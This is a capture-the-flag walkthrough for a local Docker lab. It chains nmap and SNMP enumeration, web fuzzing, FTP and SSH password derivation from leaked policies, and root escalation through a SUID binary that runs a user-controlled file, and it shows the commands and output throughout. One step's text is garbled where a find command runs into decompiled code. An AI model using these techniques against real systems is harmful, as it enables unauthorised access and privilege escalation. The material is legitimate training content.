# Yard Intranet

> North Yard Intranet (cash register, shifts, and inventory). Download the lab zip (Google Drive) and run it on Kali/Linux with Docker.
> `chmod +x startlab.sh` `./startlab.sh blackout-pt04.tar`
> The script displays the lab IP (172.18.0.2). Enumerate with nmap. Do not expose the container to the internet.
> **Tip:** start with nmap. There is more than one service and more than one account.

**Flag:** `WHOAMI{1ntr4n3t_p4t10_n14}`

---

## Solution

The challenge mixes several services (SNMP, FTP, SSH, web) and several accounts. Each step chains credentials until reaching a misconfigured SUID binary that grants root.

### 1. Start the lab and enumerate TCP + UDP

**Tool:** `nmap`. **Why:** the tip says "more than one service"; you need to scan TCP and UDP.

**Parameters:** `-sT -p-`/`--top-ports` (TCP), `-sU` (UDP), `-sV` (versions).

```bash
$ nmap -sT -T4 --top-ports 2000 172.17.0.2
21, 22, 23, 80, 199, 502 (Modbus), 2121, 8080

$ nmap -sU -T4 --top-ports 100 172.17.0.2
161/udp   open  snmp
```

**What I saw:** SNMP on UDP (as in previous challenges) and several TCP services.

### 2. SNMP: obtain the first credentials

**Tool:** `snmpwalk`. **Why:** the `public` community string often exposes contact fields, which in these labs are used as hints.

```bash
$ snmpwalk -v2c -c public 172.17.0.2 1.3.6.1.2.1.1
sysContact   = "admin"
sysLocation  = "latam123"
```

`admin:latam123` does not work for SSH, but it is context.

### 3. Web fuzzing: find hidden content

**Tool:** `gobuster` + `sitemap.xml`. **Why:** `robots.txt` and the sitemap reveal paths not shown in the menu.

```bash
$ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -t 50
admin.php   (302 → /login.php)   index.php   robots.txt   sitemap.xml

$ curl -s http://172.17.0.2/robots.txt
Disallow: /backup-old/  /internal/
```

### 4. PHP code reveals the FTP account and its policy

**Tool:** `docker exec` (reading the source code). **Why:** to understand the web login and locate service credentials.

The PHP login reads `/var/lib/latam/web.auth` (SHA256 hash of `lidia.subestacion`). And `/var/lib/latam/admin.inc` filters the FTP content:

```
Local FTP user: respaldo.caja
clave_sha256: e724a9e1...
FTP Policy: RolCaja + # + Sitio + sector (no spaces, sector two digits)
Module role: Caja   Site: Norte
```

**Decision:** derive the FTP password from the policy → `Caja#Norte14`, and verify against the SHA256 hash.

### 5. Access FTP using the policy

**Tool:** `python3` + `curl`/`nc`. **Why:** the policy provides the exact format; it is validated against the hash and used on FTP.

```bash
$ python3 -c "import hashlib; print(hashlib.sha256(b'Caja#Norte14').hexdigest())"
e724a9e18832dc72...   # matches admin.inc

$ curl -s "ftp://respaldo.caja:Caja%23Norte14@172.17.0.2/"
avisos/  bitacora/  inventario/  politicas/
```

FTP contains content: `bitacora/sesiones-2026.log` mentions the account holder **`octavio.enlace`** and `politicas/rotacion_ssh.txt` provides the SSH policy:

```
SSH Policy: Name + : + Function + : + sector
Function: Enlace   Name = first part of the account holder (before the dot)
clave_sha256: cd3a402293a22448...
```

→ Derived SSH password: **`Octavio:Enlace:14`** (verified against SHA256).

### 6. Access via SSH

**Tool:** `sshpass` + `ssh`. **Why:** the SSH password derived from the policy opens the `octavio.enlace` account.

**Parameters:** `-o PubkeyAuthentication=no -o PreferredAuthentications=password` forces password authentication (avoids failures from host key/pubkey).

```bash
$ sshpass -p "Octavio:Enlace:14" ssh -o PubkeyAuthentication=no \
    -o PreferredAuthentications=password octavio.enlace@172.17.0.2 "id"
uid=1001(octavio.enlace)
```

### 7. Find the escalation vector

**Tool:** `find -perm -4000`. **Why:** locate SUID binaries (they run with the permissions of their owner, root).

```
$ find / -perm -4000 -not -path "/proc/HOME")              # HOME controlled by the user
snprintf("%s/.inrc", HOME)       # path: $HOME/.inrc
fgets(...)                       # reads the first line of the file
call setuid(0); call setgid(0)   # elevates to root
call system(...)                 # executes that line as root
```

### 8. Escalate to root with `$HOME/.inrc`

**Tool:** shell. **Why:** `in_apply` executes the first line of `$HOME/.inrc` as root; since the user controls `$HOME`, they write the desired command.

```bash
$ echo "id > /tmp/pwned; cat /var/lib/latam/intranet.dat > /tmp/f" > /home/octavio.enlace/.inrc
$ /usr/lib/latam/in_apply
$ cat /tmp/pwned
uid=0(root) gid=0(root)
$ cat /tmp/f
WHOAMI{1ntr4n3t_p4t10_n14}
```

## Lesson

Classic pentesting chain: SNMP leaks context → source code leaks a password policy → the policy derives FTP and SSH credentials → a SUID binary that calls `system()` on a user-controlled file (`$HOME/.inrc`) converts access to root. And an important detail: forcing `PreferredAuthentications=password` prevents spurious pubkey authentication failures.

---

*Part of the **Blackout LATAM** CTF by [Whoami-Labs](https://whoami-labs.com/).*
